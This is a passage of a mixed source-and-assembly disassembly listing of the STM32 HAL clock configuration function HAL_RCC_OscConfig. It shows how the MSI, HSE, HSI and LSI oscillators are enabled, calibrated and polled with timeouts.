 80038b8:	6a1b      	ldr	r3, [r3, #32]
 80038ba:	496d      	ldr	r1, [pc, #436]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 80038bc:	4313      	orrs	r3, r2
 80038be:	600b      	str	r3, [r1, #0]
          /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
          __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 80038c0:	4b6b      	ldr	r3, [pc, #428]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 80038c2:	685b      	ldr	r3, [r3, #4]
 80038c4:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 80038c8:	687b      	ldr	r3, [r7, #4]
 80038ca:	69db      	ldr	r3, [r3, #28]
 80038cc:	021b      	lsls	r3, r3, #8
 80038ce:	4968      	ldr	r1, [pc, #416]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 80038d0:	4313      	orrs	r3, r2
 80038d2:	604b      	str	r3, [r1, #4]
 80038d4:	e025      	b.n	8003922 <HAL_RCC_OscConfig+0x122>
        }
        else
        {
          /* Else, keep current flash latency while decreasing applies */
          /* Selects the Multiple Speed oscillator (MSI) clock range .*/
          __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 80038d6:	4b66      	ldr	r3, [pc, #408]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 80038d8:	681b      	ldr	r3, [r3, #0]
 80038da:	4a65      	ldr	r2, [pc, #404]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 80038dc:	f043 0308 	orr.w	r3, r3, #8
 80038e0:	6013      	str	r3, [r2, #0]
 80038e2:	4b63      	ldr	r3, [pc, #396]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 80038e4:	681b      	ldr	r3, [r3, #0]
 80038e6:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 80038ea:	687b      	ldr	r3, [r7, #4]
 80038ec:	6a1b      	ldr	r3, [r3, #32]
 80038ee:	4960      	ldr	r1, [pc, #384]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 80038f0:	4313      	orrs	r3, r2
 80038f2:	600b      	str	r3, [r1, #0]
          /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
          __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 80038f4:	4b5e      	ldr	r3, [pc, #376]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 80038f6:	685b      	ldr	r3, [r3, #4]
 80038f8:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 80038fc:	687b      	ldr	r3, [r7, #4]
 80038fe:	69db      	ldr	r3, [r3, #28]
 8003900:	021b      	lsls	r3, r3, #8
 8003902:	495b      	ldr	r1, [pc, #364]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 8003904:	4313      	orrs	r3, r2
 8003906:	604b      	str	r3, [r1, #4]

          /* Decrease number of wait states update if necessary */
          /* Only possible when MSI is the System clock source  */
          if(sysclk_source == RCC_CFGR_SWS_MSI)
 8003908:	69bb      	ldr	r3, [r7, #24]
 800390a:	2b00      	cmp	r3, #0
 800390c:	d109      	bne.n	8003922 <HAL_RCC_OscConfig+0x122>
          {
            if(RCC_SetFlashLatencyFromMSIRange(RCC_OscInitStruct->MSIClockRange) != HAL_OK)
 800390e:	687b      	ldr	r3, [r7, #4]
 8003910:	6a1b      	ldr	r3, [r3, #32]
 8003912:	4618      	mov	r0, r3
 8003914:	f000 fd4c 	bl	80043b0 <RCC_SetFlashLatencyFromMSIRange>
 8003918:	4603      	mov	r3, r0
 800391a:	2b00      	cmp	r3, #0
 800391c:	d001      	beq.n	8003922 <HAL_RCC_OscConfig+0x122>
            {
              return HAL_ERROR;
 800391e:	2301      	movs	r3, #1
 8003920:	e37a      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
            }
          }
        }

        /* Update the SystemCoreClock global variable */
        SystemCoreClock = HAL_RCC_GetSysClockFreq() >> (AHBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos] & 0x1FU);
 8003922:	f000 fc81 	bl	8004228 <HAL_RCC_GetSysClockFreq>
 8003926:	4602      	mov	r2, r0
 8003928:	4b51      	ldr	r3, [pc, #324]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 800392a:	689b      	ldr	r3, [r3, #8]
 800392c:	091b      	lsrs	r3, r3, #4
 800392e:	f003 030f 	and.w	r3, r3, #15
 8003932:	4950      	ldr	r1, [pc, #320]	; (8003a74 <HAL_RCC_OscConfig+0x274>)
 8003934:	5ccb      	ldrb	r3, [r1, r3]
 8003936:	f003 031f 	and.w	r3, r3, #31
 800393a:	fa22 f303 	lsr.w	r3, r2, r3
 800393e:	4a4e      	ldr	r2, [pc, #312]	; (8003a78 <HAL_RCC_OscConfig+0x278>)
 8003940:	6013      	str	r3, [r2, #0]

        /* Configure the source of time base considering new system clocks settings*/
        status = HAL_InitTick(uwTickPrio);
 8003942:	4b4e      	ldr	r3, [pc, #312]	; (8003a7c <HAL_RCC_OscConfig+0x27c>)
 8003944:	681b      	ldr	r3, [r3, #0]
 8003946:	4618      	mov	r0, r3
 8003948:	f7fd fb86 	bl	8001058 <HAL_InitTick>
 800394c:	4603      	mov	r3, r0
 800394e:	73fb      	strb	r3, [r7, #15]
        if(status != HAL_OK)
 8003950:	7bfb      	ldrb	r3, [r7, #15]
 8003952:	2b00      	cmp	r3, #0
 8003954:	d052      	beq.n	80039fc <HAL_RCC_OscConfig+0x1fc>
        {
          return status;
 8003956:	7bfb      	ldrb	r3, [r7, #15]
 8003958:	e35e      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
      }
    }
    else
    {
      /* Check the MSI State */
      if(RCC_OscInitStruct->MSIState != RCC_MSI_OFF)
 800395a:	687b      	ldr	r3, [r7, #4]
 800395c:	699b      	ldr	r3, [r3, #24]
 800395e:	2b00      	cmp	r3, #0
 8003960:	d032      	beq.n	80039c8 <HAL_RCC_OscConfig+0x1c8>
      {
        /* Enable the Internal High Speed oscillator (MSI). */
        __HAL_RCC_MSI_ENABLE();
 8003962:	4b43      	ldr	r3, [pc, #268]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 8003964:	681b      	ldr	r3, [r3, #0]
 8003966:	4a42      	ldr	r2, [pc, #264]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 8003968:	f043 0301 	orr.w	r3, r3, #1
 800396c:	6013      	str	r3, [r2, #0]

        /* Get timeout */
        tickstart = HAL_GetTick();
 800396e:	f7fd fbc3 	bl	80010f8 <HAL_GetTick>
 8003972:	6138      	str	r0, [r7, #16]

        /* Wait till MSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8003974:	e008      	b.n	8003988 <HAL_RCC_OscConfig+0x188>
        {
          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)
 8003976:	f7fd fbbf 	bl	80010f8 <HAL_GetTick>
 800397a:	4602      	mov	r2, r0
 800397c:	693b      	ldr	r3, [r7, #16]
 800397e:	1ad3      	subs	r3, r2, r3
 8003980:	2b02      	cmp	r3, #2
 8003982:	d901      	bls.n	8003988 <HAL_RCC_OscConfig+0x188>
          {
            return HAL_TIMEOUT;
 8003984:	2303      	movs	r3, #3
 8003986:	e347      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8003988:	4b39      	ldr	r3, [pc, #228]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 800398a:	681b      	ldr	r3, [r3, #0]
 800398c:	f003 0302 	and.w	r3, r3, #2
 8003990:	2b00      	cmp	r3, #0
 8003992:	d0f0      	beq.n	8003976 <HAL_RCC_OscConfig+0x176>
          }
        }
         /* Selects the Multiple Speed oscillator (MSI) clock range .*/
        __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003994:	4b36      	ldr	r3, [pc, #216]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 8003996:	681b      	ldr	r3, [r3, #0]
 8003998:	4a35      	ldr	r2, [pc, #212]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 800399a:	f043 0308 	orr.w	r3, r3, #8
 800399e:	6013      	str	r3, [r2, #0]
 80039a0:	4b33      	ldr	r3, [pc, #204]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 80039a2:	681b      	ldr	r3, [r3, #0]
 80039a4:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 80039a8:	687b      	ldr	r3, [r7, #4]
 80039aa:	6a1b      	ldr	r3, [r3, #32]
 80039ac:	4930      	ldr	r1, [pc, #192]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 80039ae:	4313      	orrs	r3, r2
 80039b0:	600b      	str	r3, [r1, #0]
         /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
        __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 80039b2:	4b2f      	ldr	r3, [pc, #188]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 80039b4:	685b      	ldr	r3, [r3, #4]
 80039b6:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 80039ba:	687b      	ldr	r3, [r7, #4]
 80039bc:	69db      	ldr	r3, [r3, #28]
 80039be:	021b      	lsls	r3, r3, #8
 80039c0:	492b      	ldr	r1, [pc, #172]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 80039c2:	4313      	orrs	r3, r2
 80039c4:	604b      	str	r3, [r1, #4]
 80039c6:	e01a      	b.n	80039fe <HAL_RCC_OscConfig+0x1fe>

      }
      else
      {
        /* Disable the Internal High Speed oscillator (MSI). */
        __HAL_RCC_MSI_DISABLE();
 80039c8:	4b29      	ldr	r3, [pc, #164]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 80039ca:	681b      	ldr	r3, [r3, #0]
 80039cc:	4a28      	ldr	r2, [pc, #160]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 80039ce:	f023 0301 	bic.w	r3, r3, #1
 80039d2:	6013      	str	r3, [r2, #0]

        /* Get timeout */
        tickstart = HAL_GetTick();
 80039d4:	f7fd fb90 	bl	80010f8 <HAL_GetTick>
 80039d8:	6138      	str	r0, [r7, #16]

        /* Wait till MSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U)
 80039da:	e008      	b.n	80039ee <HAL_RCC_OscConfig+0x1ee>
        {
          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)
 80039dc:	f7fd fb8c 	bl	80010f8 <HAL_GetTick>
 80039e0:	4602      	mov	r2, r0
 80039e2:	693b      	ldr	r3, [r7, #16]
 80039e4:	1ad3      	subs	r3, r2, r3
 80039e6:	2b02      	cmp	r3, #2
 80039e8:	d901      	bls.n	80039ee <HAL_RCC_OscConfig+0x1ee>
          {
            return HAL_TIMEOUT;
 80039ea:	2303      	movs	r3, #3
 80039ec:	e314      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U)
 80039ee:	4b20      	ldr	r3, [pc, #128]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 80039f0:	681b      	ldr	r3, [r3, #0]
 80039f2:	f003 0302 	and.w	r3, r3, #2
 80039f6:	2b00      	cmp	r3, #0
 80039f8:	d1f0      	bne.n	80039dc <HAL_RCC_OscConfig+0x1dc>
 80039fa:	e000      	b.n	80039fe <HAL_RCC_OscConfig+0x1fe>
      if((READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))
 80039fc:	bf00      	nop
        }
      }
    }
  }
  /*------------------------------- HSE Configuration ------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSE) == RCC_OSCILLATORTYPE_HSE)
 80039fe:	687b      	ldr	r3, [r7, #4]
 8003a00:	681b      	ldr	r3, [r3, #0]
 8003a02:	f003 0301 	and.w	r3, r3, #1
 8003a06:	2b00      	cmp	r3, #0
 8003a08:	d073      	beq.n	8003af2 <HAL_RCC_OscConfig+0x2f2>
  {
    /* Check the parameters */
    assert_param(IS_RCC_HSE(RCC_OscInitStruct->HSEState));

    /* When the HSE is used as system clock or clock source for PLL in these cases it is not allowed to be disabled */
    if((sysclk_source == RCC_CFGR_SWS_HSE) ||
 8003a0a:	69bb      	ldr	r3, [r7, #24]
 8003a0c:	2b08      	cmp	r3, #8
 8003a0e:	d005      	beq.n	8003a1c <HAL_RCC_OscConfig+0x21c>
 8003a10:	69bb      	ldr	r3, [r7, #24]
 8003a12:	2b0c      	cmp	r3, #12
 8003a14:	d10e      	bne.n	8003a34 <HAL_RCC_OscConfig+0x234>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_HSE)))
 8003a16:	697b      	ldr	r3, [r7, #20]
 8003a18:	2b03      	cmp	r3, #3
 8003a1a:	d10b      	bne.n	8003a34 <HAL_RCC_OscConfig+0x234>
    {
      if((READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8003a1c:	4b14      	ldr	r3, [pc, #80]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 8003a1e:	681b      	ldr	r3, [r3, #0]
 8003a20:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003a24:	2b00      	cmp	r3, #0
 8003a26:	d063      	beq.n	8003af0 <HAL_RCC_OscConfig+0x2f0>
 8003a28:	687b      	ldr	r3, [r7, #4]
 8003a2a:	685b      	ldr	r3, [r3, #4]
 8003a2c:	2b00      	cmp	r3, #0
 8003a2e:	d15f      	bne.n	8003af0 <HAL_RCC_OscConfig+0x2f0>
      {
        return HAL_ERROR;
 8003a30:	2301      	movs	r3, #1
 8003a32:	e2f1      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
      }
    }
    else
    {
      /* Set the new HSE configuration ---------------------------------------*/
      __HAL_RCC_HSE_CONFIG(RCC_OscInitStruct->HSEState);
 8003a34:	687b      	ldr	r3, [r7, #4]
 8003a36:	685b      	ldr	r3, [r3, #4]
 8003a38:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8003a3c:	d106      	bne.n	8003a4c <HAL_RCC_OscConfig+0x24c>
 8003a3e:	4b0c      	ldr	r3, [pc, #48]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 8003a40:	681b      	ldr	r3, [r3, #0]
 8003a42:	4a0b      	ldr	r2, [pc, #44]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 8003a44:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8003a48:	6013      	str	r3, [r2, #0]
 8003a4a:	e025      	b.n	8003a98 <HAL_RCC_OscConfig+0x298>
 8003a4c:	687b      	ldr	r3, [r7, #4]
 8003a4e:	685b      	ldr	r3, [r3, #4]
 8003a50:	f5b3 2fa0 	cmp.w	r3, #327680	; 0x50000
 8003a54:	d114      	bne.n	8003a80 <HAL_RCC_OscConfig+0x280>
 8003a56:	4b06      	ldr	r3, [pc, #24]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 8003a58:	681b      	ldr	r3, [r3, #0]
 8003a5a:	4a05      	ldr	r2, [pc, #20]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 8003a5c:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 8003a60:	6013      	str	r3, [r2, #0]
 8003a62:	4b03      	ldr	r3, [pc, #12]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 8003a64:	681b      	ldr	r3, [r3, #0]
 8003a66:	4a02      	ldr	r2, [pc, #8]	; (8003a70 <HAL_RCC_OscConfig+0x270>)
 8003a68:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8003a6c:	6013      	str	r3, [r2, #0]
 8003a6e:	e013      	b.n	8003a98 <HAL_RCC_OscConfig+0x298>
 8003a70:	40021000 	.word	0x40021000
 8003a74:	0800d0c8 	.word	0x0800d0c8
 8003a78:	20000000 	.word	0x20000000
 8003a7c:	20000004 	.word	0x20000004
 8003a80:	4ba0      	ldr	r3, [pc, #640]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003a82:	681b      	ldr	r3, [r3, #0]
 8003a84:	4a9f      	ldr	r2, [pc, #636]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003a86:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8003a8a:	6013      	str	r3, [r2, #0]
 8003a8c:	4b9d      	ldr	r3, [pc, #628]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003a8e:	681b      	ldr	r3, [r3, #0]
 8003a90:	4a9c      	ldr	r2, [pc, #624]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003a92:	f423 2380 	bic.w	r3, r3, #262144	; 0x40000
 8003a96:	6013      	str	r3, [r2, #0]

      /* Check the HSE State */
      if(RCC_OscInitStruct->HSEState != RCC_HSE_OFF)
 8003a98:	687b      	ldr	r3, [r7, #4]
 8003a9a:	685b      	ldr	r3, [r3, #4]
 8003a9c:	2b00      	cmp	r3, #0
 8003a9e:	d013      	beq.n	8003ac8 <HAL_RCC_OscConfig+0x2c8>
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003aa0:	f7fd fb2a 	bl	80010f8 <HAL_GetTick>
 8003aa4:	6138      	str	r0, [r7, #16]

        /* Wait till HSE is ready */
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8003aa6:	e008      	b.n	8003aba <HAL_RCC_OscConfig+0x2ba>
        {
          if((HAL_GetTick() - tickstart) > HSE_TIMEOUT_VALUE)
 8003aa8:	f7fd fb26 	bl	80010f8 <HAL_GetTick>
 8003aac:	4602      	mov	r2, r0
 8003aae:	693b      	ldr	r3, [r7, #16]
 8003ab0:	1ad3      	subs	r3, r2, r3
 8003ab2:	2b64      	cmp	r3, #100	; 0x64
 8003ab4:	d901      	bls.n	8003aba <HAL_RCC_OscConfig+0x2ba>
          {
            return HAL_TIMEOUT;
 8003ab6:	2303      	movs	r3, #3
 8003ab8:	e2ae      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8003aba:	4b92      	ldr	r3, [pc, #584]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003abc:	681b      	ldr	r3, [r3, #0]
 8003abe:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003ac2:	2b00      	cmp	r3, #0
 8003ac4:	d0f0      	beq.n	8003aa8 <HAL_RCC_OscConfig+0x2a8>
 8003ac6:	e014      	b.n	8003af2 <HAL_RCC_OscConfig+0x2f2>
        }
      }
      else
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003ac8:	f7fd fb16 	bl	80010f8 <HAL_GetTick>
 8003acc:	6138      	str	r0, [r7, #16]

        /* Wait till HSE is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U)
 8003ace:	e008      	b.n	8003ae2 <HAL_RCC_OscConfig+0x2e2>
        {
          if((HAL_GetTick() - tickstart) > HSE_TIMEOUT_VALUE)
 8003ad0:	f7fd fb12 	bl	80010f8 <HAL_GetTick>
 8003ad4:	4602      	mov	r2, r0
 8003ad6:	693b      	ldr	r3, [r7, #16]
 8003ad8:	1ad3      	subs	r3, r2, r3
 8003ada:	2b64      	cmp	r3, #100	; 0x64
 8003adc:	d901      	bls.n	8003ae2 <HAL_RCC_OscConfig+0x2e2>
          {
            return HAL_TIMEOUT;
 8003ade:	2303      	movs	r3, #3
 8003ae0:	e29a      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U)
 8003ae2:	4b88      	ldr	r3, [pc, #544]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003ae4:	681b      	ldr	r3, [r3, #0]
 8003ae6:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003aea:	2b00      	cmp	r3, #0
 8003aec:	d1f0      	bne.n	8003ad0 <HAL_RCC_OscConfig+0x2d0>
 8003aee:	e000      	b.n	8003af2 <HAL_RCC_OscConfig+0x2f2>
      if((READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8003af0:	bf00      	nop
        }
      }
    }
  }
  /*----------------------------- HSI Configuration --------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI) == RCC_OSCILLATORTYPE_HSI)
 8003af2:	687b      	ldr	r3, [r7, #4]
 8003af4:	681b      	ldr	r3, [r3, #0]
 8003af6:	f003 0302 	and.w	r3, r3, #2
 8003afa:	2b00      	cmp	r3, #0
 8003afc:	d060      	beq.n	8003bc0 <HAL_RCC_OscConfig+0x3c0>
    /* Check the parameters */
    assert_param(IS_RCC_HSI(RCC_OscInitStruct->HSIState));
    assert_param(IS_RCC_HSI_CALIBRATION_VALUE(RCC_OscInitStruct->HSICalibrationValue));

    /* Check if HSI is used as system clock or as PLL source when PLL is selected as system clock */
    if((sysclk_source == RCC_CFGR_SWS_HSI) ||
 8003afe:	69bb      	ldr	r3, [r7, #24]
 8003b00:	2b04      	cmp	r3, #4
 8003b02:	d005      	beq.n	8003b10 <HAL_RCC_OscConfig+0x310>
 8003b04:	69bb      	ldr	r3, [r7, #24]
 8003b06:	2b0c      	cmp	r3, #12
 8003b08:	d119      	bne.n	8003b3e <HAL_RCC_OscConfig+0x33e>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_HSI)))
 8003b0a:	697b      	ldr	r3, [r7, #20]
 8003b0c:	2b02      	cmp	r3, #2
 8003b0e:	d116      	bne.n	8003b3e <HAL_RCC_OscConfig+0x33e>
    {
      /* When HSI is used as system clock it will not be disabled */
      if((READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U) && (RCC_OscInitStruct->HSIState == RCC_HSI_OFF))
 8003b10:	4b7c      	ldr	r3, [pc, #496]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003b12:	681b      	ldr	r3, [r3, #0]
 8003b14:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003b18:	2b00      	cmp	r3, #0
 8003b1a:	d005      	beq.n	8003b28 <HAL_RCC_OscConfig+0x328>
 8003b1c:	687b      	ldr	r3, [r7, #4]
 8003b1e:	68db      	ldr	r3, [r3, #12]
 8003b20:	2b00      	cmp	r3, #0
 8003b22:	d101      	bne.n	8003b28 <HAL_RCC_OscConfig+0x328>
      {
        return HAL_ERROR;
 8003b24:	2301      	movs	r3, #1
 8003b26:	e277      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
      }
      /* Otherwise, just the calibration is allowed */
      else
      {
        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
 8003b28:	4b76      	ldr	r3, [pc, #472]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003b2a:	685b      	ldr	r3, [r3, #4]
 8003b2c:	f023 52f8 	bic.w	r2, r3, #520093696	; 0x1f000000
 8003b30:	687b      	ldr	r3, [r7, #4]
 8003b32:	691b      	ldr	r3, [r3, #16]
 8003b34:	061b      	lsls	r3, r3, #24
 8003b36:	4973      	ldr	r1, [pc, #460]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003b38:	4313      	orrs	r3, r2
 8003b3a:	604b      	str	r3, [r1, #4]
      if((READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U) && (RCC_OscInitStruct->HSIState == RCC_HSI_OFF))
 8003b3c:	e040      	b.n	8003bc0 <HAL_RCC_OscConfig+0x3c0>
      }
    }
    else
    {
      /* Check the HSI State */
      if(RCC_OscInitStruct->HSIState != RCC_HSI_OFF)
 8003b3e:	687b      	ldr	r3, [r7, #4]
 8003b40:	68db      	ldr	r3, [r3, #12]
 8003b42:	2b00      	cmp	r3, #0
 8003b44:	d023      	beq.n	8003b8e <HAL_RCC_OscConfig+0x38e>
      {
        /* Enable the Internal High Speed oscillator (HSI). */
        __HAL_RCC_HSI_ENABLE();
 8003b46:	4b6f      	ldr	r3, [pc, #444]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003b48:	681b      	ldr	r3, [r3, #0]
 8003b4a:	4a6e      	ldr	r2, [pc, #440]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003b4c:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003b50:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003b52:	f7fd fad1 	bl	80010f8 <HAL_GetTick>
 8003b56:	6138      	str	r0, [r7, #16]

        /* Wait till HSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8003b58:	e008      	b.n	8003b6c <HAL_RCC_OscConfig+0x36c>
        {
          if((HAL_GetTick() - tickstart) > HSI_TIMEOUT_VALUE)
 8003b5a:	f7fd facd 	bl	80010f8 <HAL_GetTick>
 8003b5e:	4602      	mov	r2, r0
 8003b60:	693b      	ldr	r3, [r7, #16]
 8003b62:	1ad3      	subs	r3, r2, r3
 8003b64:	2b02      	cmp	r3, #2
 8003b66:	d901      	bls.n	8003b6c <HAL_RCC_OscConfig+0x36c>
          {
            return HAL_TIMEOUT;
 8003b68:	2303      	movs	r3, #3
 8003b6a:	e255      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8003b6c:	4b65      	ldr	r3, [pc, #404]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003b6e:	681b      	ldr	r3, [r3, #0]
 8003b70:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003b74:	2b00      	cmp	r3, #0
 8003b76:	d0f0      	beq.n	8003b5a <HAL_RCC_OscConfig+0x35a>
          }
        }

        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
 8003b78:	4b62      	ldr	r3, [pc, #392]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003b7a:	685b      	ldr	r3, [r3, #4]
 8003b7c:	f023 52f8 	bic.w	r2, r3, #520093696	; 0x1f000000
 8003b80:	687b      	ldr	r3, [r7, #4]
 8003b82:	691b      	ldr	r3, [r3, #16]
 8003b84:	061b      	lsls	r3, r3, #24
 8003b86:	495f      	ldr	r1, [pc, #380]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003b88:	4313      	orrs	r3, r2
 8003b8a:	604b      	str	r3, [r1, #4]
 8003b8c:	e018      	b.n	8003bc0 <HAL_RCC_OscConfig+0x3c0>
      }
      else
      {
        /* Disable the Internal High Speed oscillator (HSI). */
        __HAL_RCC_HSI_DISABLE();
 8003b8e:	4b5d      	ldr	r3, [pc, #372]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003b90:	681b      	ldr	r3, [r3, #0]
 8003b92:	4a5c      	ldr	r2, [pc, #368]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003b94:	f423 7380 	bic.w	r3, r3, #256	; 0x100
 8003b98:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003b9a:	f7fd faad 	bl	80010f8 <HAL_GetTick>
 8003b9e:	6138      	str	r0, [r7, #16]

        /* Wait till HSI is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U)
 8003ba0:	e008      	b.n	8003bb4 <HAL_RCC_OscConfig+0x3b4>
        {
          if((HAL_GetTick() - tickstart) > HSI_TIMEOUT_VALUE)
 8003ba2:	f7fd faa9 	bl	80010f8 <HAL_GetTick>
 8003ba6:	4602      	mov	r2, r0
 8003ba8:	693b      	ldr	r3, [r7, #16]
 8003baa:	1ad3      	subs	r3, r2, r3
 8003bac:	2b02      	cmp	r3, #2
 8003bae:	d901      	bls.n	8003bb4 <HAL_RCC_OscConfig+0x3b4>
          {
            return HAL_TIMEOUT;
 8003bb0:	2303      	movs	r3, #3
 8003bb2:	e231      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U)
 8003bb4:	4b53      	ldr	r3, [pc, #332]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003bb6:	681b      	ldr	r3, [r3, #0]
 8003bb8:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003bbc:	2b00      	cmp	r3, #0
 8003bbe:	d1f0      	bne.n	8003ba2 <HAL_RCC_OscConfig+0x3a2>
        }
      }
    }
  }
  /*------------------------------ LSI Configuration -------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSI) == RCC_OSCILLATORTYPE_LSI)
 8003bc0:	687b      	ldr	r3, [r7, #4]
 8003bc2:	681b      	ldr	r3, [r3, #0]
 8003bc4:	f003 0308 	and.w	r3, r3, #8
 8003bc8:	2b00      	cmp	r3, #0
 8003bca:	d03c      	beq.n	8003c46 <HAL_RCC_OscConfig+0x446>
  {
    /* Check the parameters */
    assert_param(IS_RCC_LSI(RCC_OscInitStruct->LSIState));

    /* Check the LSI State */
    if(RCC_OscInitStruct->LSIState != RCC_LSI_OFF)
 8003bcc:	687b      	ldr	r3, [r7, #4]
 8003bce:	695b      	ldr	r3, [r3, #20]
